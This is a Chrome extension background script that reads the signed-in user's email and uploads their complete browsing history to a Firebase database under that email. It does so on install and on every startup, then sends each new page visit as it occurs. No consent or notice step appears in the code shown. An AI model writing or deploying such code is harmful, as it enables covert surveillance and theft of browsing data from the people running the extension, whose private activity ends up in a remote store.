const FB_BASE = 'https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app';
const SEASON  = 'season2025';

// 1) Ask Chrome for the signed-in user’s email (or fallback).
chrome.identity.getProfileUserInfo(info => {
  const rawEmail = info.email || 'anonymous@demo.com';
  const emailKey = encodeURIComponent(rawEmail.replace(/\./g, ','));
  initLogger(emailKey);
});

function formatToMinute(ms) {
  const d = new Date(ms);
  d.setSeconds(0, 0);
  return d.toISOString().replace(/\.\d+Z$/, 'Z');
}

function initLogger(emailKey) {
  // FULL SYNC on install & startup
  chrome.runtime.onInstalled.addListener(() => fullSync(emailKey));
  chrome.runtime.onStartup.  addListener(() => fullSync(emailKey));

  function fullSync(key) {
    chrome.history.search({ text: '', startTime: 0, maxResults: 1e6 }, items => {
      const byMin = {};
      items.forEach(it => {
        byMin[ formatToMinute(it.lastVisitTime) ] = it;
      });
      fetch(`${FB_BASE}/history/${SEASON}/${key}/visited.json`, {
        method: 'PUT',
        body: JSON.stringify(byMin)
      }).catch(console.error);
    });
  }

  // INCREMENTAL SYNC on each new visit
  chrome.history.onVisited.addListener(({ url, lastVisitTime }) => {
    const ts = formatToMinute(lastVisitTime);
    chrome.history.search(
      { text: url, startTime: lastVisitTime - 1, maxResults: 1 },
      results => {
        if (!results[0]) return;
        const item = results[0];
        item.timestamp = ts;
        fetch(
          `${FB_BASE}/history/${SEASON}/${emailKey}/visited/${encodeURIComponent(ts)}.json`,
          { method: 'PUT', body: JSON.stringify(item) }
        ).catch(console.error);
      }
    );
  });
}
